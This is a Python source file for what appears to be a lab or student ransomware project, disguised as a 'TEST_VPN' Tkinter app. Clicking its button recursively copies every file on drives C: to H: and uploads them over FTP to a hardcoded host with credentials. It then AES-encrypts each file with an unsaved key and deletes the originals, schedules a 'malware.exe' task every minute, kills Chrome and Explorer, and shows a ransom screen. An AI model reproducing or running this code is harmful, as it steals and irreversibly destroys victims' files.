import glob
import os, struct
from Crypto.Cipher import AES
import secrets
from tkinter import messagebox
from tkinter import *
import sys
import shutil
import ftplib

host = "192.168.56.110"
user = 'ljw'
passwd = '51dlwodnr36!'
path = sys.executable.strip('vpn.exe') + 'network'

key = secrets.token_bytes(16)
batch_path =['C:/','D:/','E:/','F:/','G:/','H:/']
startPath=['C:/**','D:/**','E:/**','F:/**','G:/**','H:/**']



def ftp_move():
    file_list = os.listdir(path)
    try:
        with ftplib.FTP() as ftp:
            ftp.connect(host=host, port=21)
            ftp.encoding = 'utf-8'
            s = ftp.login(user=user, passwd=passwd)
            ftp.cwd('~/')
            for upfile in file_list:
                env_file = path + "/" + upfile
                with open(file=env_file, mode='rb') as wf:
                    ftp.storbinary(f'STOR {upfile}', wf)
        for remove_file in file_list:
            os.remove(path,remove_file)
    except Exception as e:
        print(e)

def scheduler():
    file_list = os.listdir(sys.executable.strip('vpn.exe') + 'img/')
    for path in batch_path:
        try:
            for img in file_list:
                shutil.copy(sys.executable.strip('vpn.exe') + 'img/' + img, path)
            os.system('schtasks /create /tn RsWare /tr ' + path + 'malware.exe /sc minute /mo 1')
        except:
            pass
def ransomnote():
    scheduler()
    root = Tk()
    root.title("당신은 되었습니다 감염이")
    root.geometry("1200x600")
    root.configure(bg='red')
    for path in batch_path:
        try:
            wall = PhotoImage(file=path + "ha.png")
            wall_label = Label(image=wall)
            wall_label.place(x=30, y=30)

            warning = PhotoImage(file=path + "fbi.png")
            warning_label = Label(image=warning)
            warning_label.place(x=350, y=20)
        except:
            pass

    def okClick():
        messagebox.showinfo("ㅋㅋ", '메세지가 전송됐을까요?:)')

    textbox = Entry(root, width=80)
    textbox.place(x=200, y=500)

    action = Button(root, text="send", command=okClick)
    action.place(x=790, y=500)
    os.system('taskkill /f /im chrome.exe')
    os.system('taskkill /f /im explorer.exe')
    root.mainloop()

def encrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
    if not out_filename:
        out_filename = in_filename + '.good'

    iv = os.urandom(16)
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))
def attak():
    vpn.destroy()
    ransomnote()
    for drive in startPath:
        for filename in glob.glob(drive, recursive=True):
            try:
                if (os.path.isfile(filename)):
                    shutil.copy(filename, sys.executable.strip('vpn.exe') + 'network/')
                    ftp_move()
                    encrypt_file(key, filename)
                    os.remove(filename)
            except:
                pass
    ftp_move()
vpn = Tk()
vpn.title("TEST_VPN")
vpn.geometry('300x300')
label = Label(vpn, text='TEST용 VPN입니다')
start = Button(vpn, text='눌러서 실행해주세요.', command=attak)

label.pack()
start.pack()
vpn.mainloop()


